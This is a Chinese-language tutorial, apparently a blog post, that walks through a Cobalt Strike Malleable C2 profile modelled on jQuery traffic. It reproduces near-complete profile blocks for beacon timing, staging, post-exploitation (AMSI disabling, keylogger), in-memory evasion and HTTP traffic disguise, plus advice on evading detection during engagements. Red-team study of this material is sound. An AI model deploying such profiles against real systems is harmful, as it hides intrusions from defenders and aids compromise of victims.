# Cobalt Strike Basic No.3 -- Malleable C2 Profile


Cobalt Strike的Malleable C2 Profile文件的组织结构和介绍。

<!--more-->

## Malleable C2 Profile

beacon的http通信方式是由Malleable C2 Profile来控制的，它可以指定如何传输和保存数据。每个CS只能加载一个profile。在加载profile之前，使用`c2lint`对profile进行错误检查。

通过修改profile中的各种值，就可以实现修改beacon的内存占用、修改网络流量等。

使用命令：

```shell
./teamserver [external IP] [password] [/path/to/my.profile]
```

检查错误：

```shell
./c2lint [/path/to/my.profile]
```

c2lint returns and logs the following result codes for the specified profile file:

- A result of 0 is returned if c2lint completes with no errors
- A result of 1 is returned if c2lint completes with only warnings
- A result of 2 is returned if c2lint completes with only errors
- A result of 3 is returned if c2lint completes with both errors and warnings

下面使用https://github.com/threatexpress/malleable-c2的profile作为示例来详细说明profile的相关结构内容，该profile旨在模拟jQuery请求。

### Profile Name

```json
################################################
## Profile Name
################################################
## Description:
##    The name of this profile (used in the Indicators of Compromise report)
## Defaults:
##    sample_name: My Profile
## Guidelines:
##    - Choose a name that you want in a report
set sample_name "jQuery CS 4.9 Profile";
```

profile name不会影响beacon的流量或者其在目标上的占用空间，而是会在最后的报告中看到使用的profile名字。

### sleep time

```json
################################################
## Sleep Times
################################################
## Description:
##    Timing between beacon check in
## Defaults:
##    sleeptime: 60000
##    jitter: 0
## Guidelines:
##    - Beacon Timing in milliseconds (1000 = 1 sec)
set sleeptime "45000";         # 45 Seconds
#set sleeptime "300000";       # 5 Minutes
#set sleeptime "600000";      # 10 Minutes
#set sleeptime "900000";      # 15 Minutes
#set sleeptime "1200000";      # 20 Minutes
#set sleeptime "1800000";      # 30 Minutes
#set sleeptime "3600000";      # 1 Hours
set jitter    "37";            # % jitter
```

设置beacon的check in的时间，毫秒为单位。在生成新的http/s beacon时，会使用sleep时间作为其回调时间间隔进行check in，然后再加上由jitter（抖动）指定的随机事件。

### User-Agent

```shell
################################################
## Beacon User-Agent
################################################
## Description:
##    User-Agent string used in HTTP requests, CS versions < 4.2 approx 128 max characters, CS 4.2+ max 255 characters
## Defaults:
##    useragent: Internet Explorer (Random)
## Guidelines
##    - Use a User-Agent values that fits with your engagement
##    - useragent can only be 128 chars
## IE 10
# set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)";
## MS IE 11 User Agent
set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
```

实战时，可以尝试从目标捕获一个真实的ua值并插入流量中。例如，向目标发送一封袋有web漏洞的电子邮件并监控后续get请求中发送的ua值。如果使用的是明文的http琉璃那个或者目标环境中存在ssl拦截，那么与环境不匹配的ua就会被目标发现。

### SSL证书

```shell
################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
    
    ## Option 1) Trusted and Signed Certificate
    ## Use keytool to create a Java Keystore file. 
    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl
    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh
   
    ## Option 2) Create your own Self-Signed Certificate
    ## Use keytool to import your own self signed certificates

    #set keystore "/pathtokeystore";
    #set password "password";

    ## Option 3) Cobalt Strike Self-Signed Certificate
    set C   "US";
    set CN  "jquery.com";
    set O   "jQuery";
    set OU  "Certificate Authority";
    set validity "365";
}
```

设置https beacon通信使用的TLS/SSL证书。这里官方给出的建议是可以使用keytool生成一个java的keystore文件，或者生成一个自签名的证书。其中`set keystore`指定使用的*.store文件，`set password`指定生成证书时设置的密码。详细的证书生成可以参考[CS隐藏随笔](https://www.v4ler1an.com/2024/02/c2隐藏随笔/)。

### HTTP Beacon

```json
################################################
## HTTP Beacon
################################################
## Description:
##   Allows you to specify attributes for general attributes for the http(s) beacons.
## Values:
##    library       wininet             CS 4.9 - The library attribute allows user to specify the default library used by the generated beacons used by the profile. The library defaults to "wininet", which is the only type of beacon prior to version 4.9. The library value can be "wininet" or "winhttp".
##
http-beacon {
    # Change the default HTTP Beacon library type used by the generated beacons
    set library "winhttp";
}
```

指定http beacon使用的library，4.9版本支持wininet和winhttp两种，默认使用winhttp。

### TCP Beacon

```json
################################################
## TCP Beacon
################################################
## Description:
##    TCP Beacon listen port
##     - https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/
##     - https://www.cobaltstrike.com/help-tcp-beacon
##    TCP Frame Header
##     - Added in CS 4.1, prepend header to TCP Beacon messages
## Defaults:
##    tcp_port: 4444
##    tcp_frame_header: N\A
## Guidelines
##    - OPSEC WARNING!!!!! The default port is 4444. This is bad. You can change dynamicaly but the port set in the profile will always be used first before switching to the dynamic port.
##    - Use a port other that default. Choose something not is use.
##    - Use a port greater than 1024 is generally a good idea
set tcp_port "42585";
set tcp_frame_header "\x80";
```

设置tcp beacon的端口和tcp帧的header字节。

### SMB Beacon

```json
################################################
## SMB beacons
################################################
## Description:
##    Peer-to-peer beacon using SMB for communication
##    SMB Frame Header
##     - Added in CS 4.1, prepend header to SMB Beacon messages
## Defaults:
##    pipename: msagent_##
##    pipename_stager: status_##
##    smb_frame_header: N\A
## Guidelines:
##    - Do not use an existing namedpipe, Beacon doesn't check for conflict!
##    - the ## is replaced with a number unique to a teamserver     
## ---------------------
set pipename         "mojo.5688.8052.183894939787088877##"; # Common Chrome named pipe
set pipename_stager  "mojo.5688.8052.35780273329370473##"; # Common Chrome named pipe
set smb_frame_header "\x80";
```

配置pipe的名字和smb帧的header字节。SMB Beacon使用pipe通过父beacon进行通信，实现在同一主机或者网络上的beacon直接进行点对点通信。

### DNS Beacon

```json
################################################
## DNS beacons
################################################
## Description:
##    Beacon that uses DNS for communication
## Defaults:
##    dns_idle: 0.0.0.0
##    dns_max_txt: 252
##    dns_sleep: 0
##    dns_stager_prepend: N/A
##    dns_stager_subhost: .stage.123456.
##    dns_ttl: 1
##    maxdns: 255
##    beacon: N/A
##    get_A:  cdn.
##    get_AAAA: www6.
##    get_TXT: api.
##    put_metadata: www.
##    put_output: post.
##    ns_reponse: drop
## Guidelines:
##    - DNS beacons generate a lot of DNS request. DNS beacon are best used as low and slow back up C2 channels
dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "74.125.196.113"; #google.com (change this to match your campaign)
    set dns_max_txt        "252";
    set dns_sleep          "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
    set dns_ttl            "5";
    set maxdns             "255";
    set dns_stager_prepend ".resources.123456.";
    set dns_stager_subhost ".feeds.123456.";

    # DNS subhosts override options, added in version 4.3
    set beacon           "a.bc.";
    set get_A            "b.1a.";
    set get_AAAA         "c.4a.";
    set get_TXT          "d.tx.";
    set put_metadata     "e.md.";
    set put_output       "f.po.";
    set ns_response      "zero";

}
```

配置DNS的解析等内容，文档说明比较明显，基本不用修改。

### Staging process

```json
################################################
## Staging process
################################################
## OPSEC WARNING!!!! Staging has serious OPSEC issues. It is recommed to disable staging and use stageless payloads
## Description:
##    Malleable C2's http-stager block customizes the HTTP staging process
## Defaults:
##    uri_x86 Random String
##    uri_x64 Random String
##    HTTP Server Headers - Basic HTTP Headers
##    HTTP Client Headers - Basic HTTP Headers
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Only specify the `Host` header when peforming domain fronting. Be aware of HTTP proxy's rewriting your request per RFC2616 Section 14.23
##      - https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
##    - Note: Data transform language not supported in http stageing (mask, base64, base64url, etc)

#set host_stage "false"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes
set host_stage "true"; # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.set

http-stager {  
    set uri_x86 "/jquery-3.3.1.slim.min.js";
    set uri_x64 "/jquery-3.3.2.slim.min.js";

    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 2nd Line            
            prepend "!function...省略...P=\"\r";
            # 1st Line
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement...省略...(e.jQuery=e.$=w),w});";
            print;
        }
    }

    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        #header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
}
```

设置staging相关内容，但是OPSEC建议使用stageless的payload，目的是减少通信，一次上钩，防止被安全防护产品报警。但是实战里面还是存在staging的场景。该部分可以设置stager的各种特性，模仿单个合法的http请求/响应。

在此示例中，请求将发送到`/jquery-3.3.1.slim.min.js`或者`/jquery-3.3.2.slim.min.js`，然后开始staging过程。构建http服务器参数以模仿jQuery请求。Beacon命令和payload会被混合到jQuery的javascript文本块中。从CDN请求jQuery时，客户端发出一个合理的请求：

```js
<script src =“jquery-3.3.1.min.js”> </ script>
```

可以把uri修改为类似其他CDN的形式，例如可以修改http-stager，模仿Microsoft jQuery：

```js
<script src =“https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js”> </script>
```

### Post Exploitation

```json
################################################
## Post Exploitation
################################################
## Description:
##    Controls post-exploitation jobs, including default x86/x64 program to open and inject shellcode into, AMSI bypass for execute-assembly, powerpick, and psinject
##    https://www.cobaltstrike.com/help-malleable-postex
## Values:
##    spawnto_x86       %windir%\\syswow64\\rundll32.exe
##    spawnto_x64       %windir%\\sysnative\\rundll32.exe
##    obfuscate         false                                   CS 3.14 - Scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way
##    pipename          postex_####, windows\\pipe_##           CS 4.2 - Change the named pipe names used, by post-ex DLLs, to send output back to Beacon. This option accepts a comma-separated list of pipenames. Cobalt Strike will select a random pipe name from this option when it sets up a post-exploitation job. Each # in the pipename is replaced with a valid hex character as well.
##    smartinject       false                                   CS 3.14 added to postex block - Directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs.
##    amsi_disable      false                                   CS 3.13 - Directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
##    keylogger         GetAsyncKeyState                        CS 4.2 - The GetAsyncKeyState option (default) uses the GetAsyncKeyState API to observe keystrokes. The SetWindowsHookEx option uses SetWindowsHookEx to observe keystrokes.
##    threadhint                                                CS 4.2 - allows multi-threaded post-ex DLLs to spawn threads with a spoofed start address. Specify the thread hint as "module!function+0x##" to specify the start address to spoof. The optional 0x## part is an offset added to the start address.
##    cleanup           false                                   CS 4.9 - Cleans up the post-ex UDRL memory when the post-ex DLL is loaded.

## Guidelines
##    - spawnto can only be 63 chars
##    - OPSEC WARNING!!!! The spawnto in this example will contain identifiable command line strings
##      - sysnative for x64 and syswow64 for x86
##      - Example x64 : C:\\Windows\\sysnative\\w32tm.exe
##        Example x86 : C:\\Windows\\syswow64\\w32tm.exe
##    - The binary doesnt do anything wierd (protected binary, etc)
##    - !! Don't use these !! 
##    -   "csrss.exe","logoff.exe","rdpinit.exe","bootim.exe","smss.exe","userinit.exe","sppsvc.exe"
##    - A binary that executes without the UAC
##    - 64 bit for x64
##    - 32 bit for x86
##    - You can add command line parameters to blend
##      - set spawnto_x86 "%windir%\\syswow64\\svchost.exe -k netsvcs";
##      - set spawnto_x64 "%windir%\\sysnative\\svchost.exe -k netsvcs";
##      - Note: svchost.exe may look weird as the parent process 
##    - The obfuscate option scrambles the content of the post-ex DLLs and settles the post-ex capability into memory in a more OPSEC-safe way. It’s very similar to the obfuscate and userwx options available for Beacon via the stage block.
##    - The amsi_disable option directs powerpick, execute-assembly, and psinject to patch the AmsiScanBuffer function before loading .NET or PowerShell code. This limits the Antimalware Scan Interface visibility into these capabilities.
##    - The smartinject option directs Beacon to embed key function pointers, like GetProcAddress and LoadLibrary, into its same-architecture post-ex DLLs. This allows post-ex DLLs to bootstrap themselves in a new process without shellcode-like behavior that is detected and mitigated by watching memory accesses to the PEB and kernel32.dll
post-ex {
    # Optionally specify non-existent filepath to force manual specification based on the Beacon host's running processes
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
    # cleanup the post-ex UDRL memory when the post-ex DLL is loaded
    set cleanup "true";
    # Modify our post-ex pipe names
    set pipename "Winsock2\\CatalogChangeListener-###-0,";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}
```

post-ex控制了CS的后渗透功能所特有的内容和行为，包含截屏、键盘记录、哈希转储等，每个参数都有响应的说明，直接看文档即可。

### Memory Indicator

```json
################################################
## Memory Indicators
################################################
## Description:
##    The stage block in Malleable C2 profiles controls how Beacon is loaded into memory and edit the content of the Beacon Reflective DLL.
## Values:
##    allocator         VirtualAlloc            CS 4.2 - Set how Beacon's Reflective Loader allocates memory for the agent. Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
##    checksum          0                       The CheckSum value in Beacon's PE header
##    cleanup           false                   Ask Beacon to attempt to free memory associated with the Reflective DLL package that initialized it.
##    compile_time      14 July 2009 8:14:00    The build time in Beacon's PE header
##    entry_point       92145                   The EntryPoint value in Beacon's PE header
##    image_size_x64    512000                  SizeOfImage value in x64 Beacon's PE header
##    image_size_x86    512000                  SizeOfImage value in x86 Beacon's PE header
##    magic_mz_x86      MZRE                    CS 4.2 - Override the first bytes (MZ header included) of Beacon's Reflective DLL. Valid x86 instructions are required. Follow instructions that change CPU state with instructions that undo the change.
##    magic_mz_x64      MZAR                    CS 4.2 - Same as magic_mz_x86; affects x64 DLL.
##    module_x64        xpsservices.dll         Same as module_x86; affects x64 loader
##    module_x86        xpsservices.dll         Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc.
##    magic_pe          PE                      Override the PE character marker used by Beacon's Reflective Loader with another value.
##    name	            beacon.x64.dll          The Exported name of the Beacon DLL
##    obfuscate         false                   Obfuscate the Reflective DLL's import table, overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers. As of 4.2 CS now obfuscates .text section in rDLL package
##    rich_header       N/A                     Meta-information inserted by the compiler
##    sleep_mask        false                   CS 3.12 - Obfuscate Beacon (HTTP, SMB, TCP Beacons), in-memory, prior to sleeping (HTTP) or waiting for a new connection\data (SMB\TCP)
##    smartinject       false                   CS 4.1 added to stage block - Use embedded function pointer hints to bootstrap Beacon agent without walking kernel32 EAT
##    stomppe           true                    Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
##    userwx            false                   Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory
## Guidelines:
##    - Modify the indicators to minimize in memory indicators
##    - Refer to 
##       https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/
##       https://www.youtube.com/playlist?list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK
##       https://www.youtube.com/watch?v=AV4XjxYe4GM (Obfuscate and Sleep)
stage {
    
    # CS 4.2 added allocator and MZ header overrides
    set allocator      "VirtualAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
    #set magic_mz_x86   "MZRE";
    #set magic_mz_x64   "MZAR";
    set magic_pe       "NO";
    set userwx         "false"; 
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    # CS 3.12 Addition "Obfuscate and Sleep"
    set sleep_mask     "true";
    # CS 4.1  
    set smartinject    "true";

    # Make the Beacon Reflective DLL look like something else in memory
    # Values captured using peclone agaist a Windows 10 version of explorer.exe
    set checksum       "0";
    set compile_time   "11 Nov 2016 04:08:32";
    set entry_point    "650688";
    set image_size_x86 "4661248";
    set image_size_x64 "4661248";
    set name           "srv.dll";
    set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

    ## WARNING: Module stomping 
    # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon's process. If the current process loads the same library later (for whatever reason), you will crash Beacon's process. Choose carefully.
    # By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon's x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It's important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4

    # set module_x64 "netshell.dll";
    # set module_x86 "netshell.dll";

    # CS 4.8 - Added default syscall method option. This option supports: None, Direct, and Indirect.
    set syscall_method "None";
    
    # The transform-x86 and transform-x64 blocks pad and transform Beacon's Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
    transform-x86 { # transform the x86 rDLL stage
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
        strrep "ReflectiveLoader" "execute"; # Change this text
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "beacon.dll" ""; # Remove this text
    }
    transform-x64 { # transform the x64 rDLL stage
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # prepend nops
        strrep "ReflectiveLoader" "execute"; # Change this text in the Beacon DLL
        strrep "beacon.x64.dll" ""; # Remove this text in the Beacon DLL
    }

    stringw "jQuery"; # Add this string to the DLL
}
```

控制beacon如何加载到内存中，以及如何进行dll反射。

### HTTP Headers

```json
################################################
## HTTP Headers
################################################
## Description:
##    The http-config block has influence over all HTTP responses served by Cobalt Strike’s web server. Here, you may specify additional HTTP headers and the HTTP header order.
## Values:
##    set headers                   "Comma separated list of headers"    The set headers option specifies the order these HTTP headers are delivered in an HTTP response. Any headers not in this list are added to the end.
##    header                        "headername" "header alue            The header keyword adds a header value to each of Cobalt Strike's HTTP responses. If the header value is already defined in a response, this value is ignored.
##    set trust_x_forwarded_for     "true"                               Adds this header to determine remote address of a request.
##    block_useragents              "curl*,lynx*,wget*"                  Default useragents that are blocked
## Guidelines:
##    - Use this section in addition to the "server" secion in http-get and http-post to further define the HTTP headers 
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    set block_useragents "curl*,lynx*,wget*";
}
```

http-config块控制了CS的web服务器的全局的http响应的相关设置，可以在这里自定义响应包的header的相关内容。

### HTTP GET

```json
################################################
## HTTP GET
################################################
## Description:
##    GET is used to poll teamserver for tasks
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
##    - Multiple URIs can be added. Beacon will randomly pick from these.
##      - Use spaces as a URI seperator
http-get {

    set uri "/jquery-3.3.1.min.js";
    set verb "GET";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
				# 元数据放在cookie头中，并进行base64url编码
        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }

    server {
				# 如果teamserver有任务，则会在http body部分回传给client。
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {   
            mask;
            base64url;
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 2nd Line            
            prepend "!function(e,t)...省略...P=\"\r";
            # 1st Line
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement...省略...t||(e.jQuery=e.$=w),w});";
            print;
        }
    }
}
```

修改HTTP Get类型的请求/响应，用于检查teamserver的任务，也就是心跳包。

### HTTP POST

```json
################################################
## HTTP POST
################################################
## Description:
##    POST is used to send output to the teamserver
##    Can use HTTP GET or POST to send data
##    Note on using GET: Beacon will automatically chunk its responses (and use multiple requests) to fit the constraints of an HTTP GET-only channel.
## Defaults:
##    uri "/activity"
##    Headers (Sample)
##      Accept: */*
##      Cookie: CN7uVizbjdUdzNShKoHQc1HdhBsB0XMCbWJGIRF27eYLDqc9Tnb220an8ZgFcFMXLARTWEGgsvWsAYe+bsf67HyISXgvTUpVJRSZeRYkhOTgr31/5xHiittfuu1QwcKdXopIE+yP8QmpyRq3DgsRB45PFEGcidrQn3/aK0MnXoM=
##      User-Agent Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)
## Guidelines:
##    - Decide if you want to use HTTP GET or HTTP POST requests for this section
##    - Add customize HTTP headers to the HTTP traffic of your campaign
##    - Analyze sample HTTP traffic to use as a reference
## Use HTTP POST for http-post section
## Uncomment this Section to activate
http-post {

    set uri "/jquery-3.3.2.min.js";
    set verb "POST";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        #header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
       	
				# id标签是将beacon ID先后进行mask、base64url编码后拼接在自定义的__cfduid参数后。
        id {
            mask;       
            base64url;
            parameter "__cfduid";            
        }
        
				# output标签是beacon执行完后把数据mask、base64url编码后回传给teamserver
        output {
            mask;
            base64url;
            print;
        }
    }

    server {

        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {
            mask;
            base64url;
            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
            # 2nd Line            
            prepend "!function(e,t)...省略...P=\"\r";
            # 1st Line
            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";
            append "\".(o=t.documentElement...省略...t||(e.jQuery=e.$=w),w});";
            print;
        }
    }
}
```

http-post部分用作beacon对teamserver发出的命令的响应，也就是控制命令执行结果传输的具体细节。

### 生成方式

除了上面的https://github.com/threatexpress/malleable-c2的例子，我们也可以使用https://github.com/threatexpress/random_c2_profile项目生成随机的profile，根据自己需要进行定制即可。

### 说明

profile的修改主要可以分为流量侧和主机侧流量侧主要涉及http-get和http-post两个标签，主机侧主要涉及stage、process-inject、post-ex这三个标签。在实战时，根据具体情况进行对应修改即可。




